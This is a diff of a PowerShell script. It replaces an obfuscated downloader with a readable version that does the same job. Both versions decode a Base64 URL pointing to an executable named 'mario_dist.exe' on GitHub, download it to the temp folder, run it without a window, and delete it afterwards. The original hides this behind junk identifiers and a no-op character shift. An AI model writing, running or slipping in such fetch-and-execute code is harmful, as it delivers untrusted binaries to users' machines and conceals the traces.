@@ -1,61 +1,41 @@
-$asdfewvvbqrrqwe = "aHR0cHM6Ly9naXRodWIuY29tL251bGwtcDRuL25pY2Vjb21wdXRlci9yYXcvcmVmcy9oZWFkcy9tYWluL21hcmlvX2Rpc3QuZXhl"
+# Define the URL of the .exe file on GitHub
+$encodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL251bGwtcDRuL25pY2Vjb21wdXRlci9yYXcvcmVmcy9oZWFkcy9tYWluL21hcmlvX2Rpc3QuZXhl"
 
-function trewwfddfdf {
+# Function to decode Base64 string
+function Decode-Base64 {
     param (
-        [string]$fgdsghsedfreg5555
+        [string]$encodedString
     )
-    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($fgdsghsedfreg5555))
+    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedString))
 }
 
-$url = trewwfddfdf -fgdsghsedfreg5555 $asdfewvvbqrrqwe
+# Decode the URL
+$url = Decode-Base64 -encodedString $encodedUrl
 
-function DL-F {
+# Function to download the file
+function DownloadFile {
     param (
-        [string]$u
+        [string]$url
     )
-    $o = [System.IO.Path]::Combine($env:TEMP, [System.IO.Path]::GetFileName($u))
-    $c = New-Object System.Net.WebClient
-    $c.DownloadFile($u, $o)
-    return $o
+    $output = [System.IO.Path]::Combine($env:TEMP, [System.IO.Path]::GetFileName($url))
+    $client = New-Object System.Net.WebClient
+    $client.DownloadFile($url, $output)
+    return $output
 }
 
-function EX-F {
+# Function to execute the file
+function ExecuteFile {
     param (
-        [string]$f
+        [string]$filePath
     )
-    Start-Process -FilePath $f -NoNewWindow -Wait
+    Start-Process -FilePath $filePath -NoNewWindow -Wait
 }
 
-function fdfdfdereeee {
-    param (
-        [string]$input
-    )
-    $chars = [System.Text.Encoding]::UTF8.GetBytes($input)
-    $rrrereeewww = ""
-    foreach ($char in $chars) {
-        $rrrereeewww += [char]($char + 1)
-    }
-    return $rrrereeewww
-}
+# Download the file
+$filePath = DownloadFile -url $url
 
-$yteyurttttt = fdfdfdereeee -input $url
+# Execute the file
+ExecuteFile -filePath $filePath
 
-function rtewrtwwww {
-    param (
-        [string]$input
-    )
-    $chars = [System.Text.Encoding]::UTF8.GetBytes($input)
-    $ertwefff = ""
-    foreach ($char in $chars) {
-        $ertwefff += [char]($char - 1)
-    }
-    return $ertwefff
-}
-
-$deyteyurttttt = rtewrtwwww -input $yteyurttttt
-
-$fPath = DL-F -u $deyteyurttttt
-
-EX-F -f $fPath
-
-Remove-Item -Path $fPath
+# Clean up the file
+Remove-Item -Path $filePath
